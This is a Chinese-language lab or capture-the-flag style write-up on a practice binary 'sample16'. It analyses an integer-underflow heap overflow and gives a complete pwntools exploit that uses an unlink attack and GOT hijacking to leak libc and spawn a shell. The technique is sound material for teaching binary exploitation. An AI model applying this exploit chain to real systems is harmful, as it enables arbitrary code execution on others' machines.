# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的执行环境如下：

- **文件类型**: ELF 64-bit LSB executable, x86-64
- **安全防护**:
  - Partial RELRO: GOT表可写，便于利用
  - Stack Canary: 存在栈保护，但漏洞利用绕过堆栈
  - NX Enabled: 数据段不可执行，需使用ROP或代码复用
  - No PIE: 代码段固定地址，便于计算偏移
- **依赖库**: 标准libc (libc.so.6)，通过ldd确认
- **运行要求**: 需要标准Linux环境，程序名为sample16

## 漏洞成因

### 关键结构体分析
程序使用以下全局数据结构管理堆内存：
```c
// 全局指针数组，存储7个note的指针
void *ptr[7] @ 0x6020C8;

// 全局控制结构，存储指针和大小信息
__int64 qword_6020C0[16] @ 0x6020C0;  // [0]为当前指针，[8-14]为大小
```

### 漏洞详细分析
**主要漏洞**: 堆溢出漏洞，位于`sub_4008DD`函数中：

```c
unsigned __int64 sub_4008DD(__int64 a1, __int64 a2, char a3) {
  for (i = 0; a2 - 1 > i; ++i) {  // 关键漏洞点
    read(0, &buf, 1);
    if (buf == a3) break;
    *(BYTE *)(i + a1) = buf;      // 可能写入超出边界
  }
  *(BYTE *)(a1 + i) = 0;
  return i;
}
```

**漏洞机理**:
1. 当`a2=0`时（如`new(b'0', ...)`），`a2 - 1`由于无符号整数下溢变为`0xFFFFFFFFFFFFFFFF`
2. 循环条件`a2 - 1 > i`始终为真，允许写入大量数据
3. 写入操作`*(BYTE *)(i + a1) = buf`超出分配的堆块边界，覆盖相邻堆块的元数据

**辅助漏洞**: UAF（Use-After-Free）
- 在`sub_400B33`删除函数中，free后指针未及时清空
- 结合堆溢出，可实现更复杂的利用

## 漏洞利用过程

### 内存变化时序表

| 步骤 | 操作 | 堆内存状态 | 全局指针状态 | Bins状态 | 关键事件 |
|------|------|------------|--------------|----------|----------|
| 初始 | - | 空闲状态 | 指针为NULL | 所有bin空 | 程序启动 |
| 1 | 创建4个note | 分配4个chunk:<br>• 0x1ab38000 (size=0x21)<br>• 0x1ab38020 (size=0x110)<br>• 0x1ab38130 (size=0x110)<br>• 0x1ab38240 (size=0x110) | ptr[0-3]指向堆地址 | 所有bin空 | 堆溢出确认 |
| 2 | 编辑note0构造payload | 伪造chunk结构:<br>• 设置size=0x121, 0x101<br>• 设置fd/bk指向全局变量 | 无变化 | 所有bin空 | 准备unlink攻击 |
| 3 | 删除note1 | note1进入unsorted bin<br>fd/bk指向main_arena | ptr[2]被修改为0x6020C0<br>unlink攻击成功 | unsorted bin包含0x1ab38020 | 获得任意写原语 |
| 4 | 编辑note2修改指针 | 堆内容包含GOT地址 | ptr数组指向:<br>• free_got (0x602018)<br>• atoi_got (0x602070) | unsorted bin保持 | 控制指针指向GOT |
| 5 | 编辑note0覆盖GOT | - | free_got被覆盖为puts_plt (0x400730) | unsorted bin保持 | GOT劫持完成 |

| 7 | 编辑note3覆盖GOT | - | atoi_got被覆盖为system地址 | unsorted bin保持 | 准备getshell |
| 8-10 | 触发system | 进程切换为/bin/dash | 原始程序内存不可访问 | 新进程bins | 成功获取shell |

### 关键内存布局演变
1. **初始堆布局**: 连续分配的chunk，元数据完整
2. **伪造chunk后**: 相邻chunk的prev_size和size字段被覆盖，设置伪造的fd/bk
3. **unlink触发后**: 全局指针被修改，实现任意地址读写
4. **GOT覆盖后**: 函数调用被重定向，控制流被劫持

## Exploit

以下是完整的漏洞利用脚本，在关键位置添加了详细注释：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动进程并加载ELF信息
p = process('./data/sample16')
elf = ELF('./data/sample16')
libc = elf.libc

# 关键地址定义
ptr = 0x6020C8          # 全局指针数组地址
free_got = elf.got['free']    # free函数GOT条目地址
atoi_got = elf.got['atoi']    # atoi函数GOT条目地址  
puts_plt = elf.plt['puts']    # puts函数PLT地址

# 功能函数定义
def new(size, content):
    """创建新note"""
    p.recvuntil(b'>>\n')
    p.sendline(b'1')  # 选择新建选项
    p.recvuntil(b'1024)\n')
    p.sendline(size)  # 发送大小
    p.recvuntil(b'content:\n')
    p.sendline(content)  # 发送内容

def show():
    """显示note（实际被禁用）"""
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    """编辑指定id的note内容"""
    p.recvuntil(b'>>\n')
    p.sendline(b'3')  # 选择编辑选项
    p.recvuntil(b'note:\n')
    p.sendline(idx)   # 发送note id
    p.recvuntil(b'content:\n')
    p.sendline(content)  # 发送新内容

def delete(idx):
    """删除指定id的note"""
    p.recvuntil(b'>>\n')
    p.sendline(b'4')  # 选择删除选项
    p.recvuntil(b'note:\n')
    p.sendline(idx)   # 发送note id

# ==================== 漏洞利用开始 ====================

# Step 1: 分配多个note，构造堆布局
# 创建size=0的note0触发堆溢出漏洞，同时分配3个正常size的note
new(b'0', b'aaaa')
new(b'256', b'aaaa') 
new(b'256', b'aaaa')
new(b'256', b'aaaa')

# Step 2: 通过note0的堆溢出构造伪造chunk结构
# 计算unlink攻击所需的fd/bk指针，指向全局变量区域
fd = ptr + 0x10 - 0x18  # 指向qword_6020C0
bk = ptr + 0x10 - 0x10  # 指向ptr数组

# 构造复杂的payload，包含多个伪造的chunk元数据
payload = p64(0) * 3                    # 填充前3个qword
payload += p64(0x121)                   # 伪造chunk size
payload += b'a' * 0x110                 # 填充数据
payload += p64(0) + p64(0x101)          # 下一个chunk的prev_size和size
payload += p64(fd) + p64(bk)            # 关键：设置伪造的fd/bk指针触发unlink
payload += b'a' * (0x100 - 0x20)        # 继续填充
payload += p64(0x100) + p64(0x110)      # 设置后续chunk的size

edit(b'0', payload)  # 通过编辑note0触发堆溢出，覆盖相邻chunk

# Step 3: 删除note1触发unlink攻击
# unlink宏操作：FD->bk = BK, BK->fd = FD
# 这将修改全局指针，实现任意地址写原语
delete(b'1')

# Step 4: 编辑note2修改全局指针数组，使其指向GOT表
payload = b'a' * 0x8                    # 初始填充
payload += p64(free_got)                # 将指针指向free的GOT
payload += p64(atoi_got)                # 指向atoi的GOT  
payload += p64(atoi_got)                # 重复指向atoi的GOT
payload += p64(atoi_got)                # 再次指向atoi的GOT

edit(b'2', payload)  # 修改全局指针，现在可以任意读写GOT表

# Step 5: 覆盖free_got为puts_plt，用于函数地址泄露
# 当调用free时实际执行puts，可以泄露内存内容
edit(b'0', p64(puts_plt)[:-1])  # 使用[:-1]避免null字节问题

# Step 6: 删除note2触发puts(atoi_got)，泄露atoi函数地址
delete(b'2')
# 接收泄露的atoi地址并解析
atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

# Step 7: 计算libc基址和system地址，覆盖atoi_got
libc_addr = atoi_addr - libc.symbols['atoi']  # 计算libc基地址
system_addr = libc.symbols['system'] + libc_addr  # 计算system函数地址
edit(b'3', p64(system_addr)[:-1])  # 覆盖atoi_got为system

# Step 8-10: 触发system("/bin/sh")获取shell
p.recvuntil(b'>>\n')
# 此时atoi被劫持为system，输入"/bin/sh"将执行system("/bin/sh")
p.sendline(b'/bin/sh')

# 进入交互模式，获得shell控制权
p.interactive()
```

### 利用脚本关键点说明
1. **堆布局精心设计**: 通过特定大小的note分配，创造有利的堆内存布局
2. **unlink攻击利用**: 通过伪造chunk的fd/bk指针，触发unlink操作修改全局指针
3. **GOT劫持策略**: 分两步覆盖GOT表，先泄露地址再获取shell
4. **地址计算精确**: 基于泄露的libc地址精确计算system函数位置
5. **进程控制完整**: 从内存破坏到完全控制进程执行流

该漏洞利用成功演示了如何通过堆溢出漏洞实现从任意内存读写到完全代码执行的全过程。
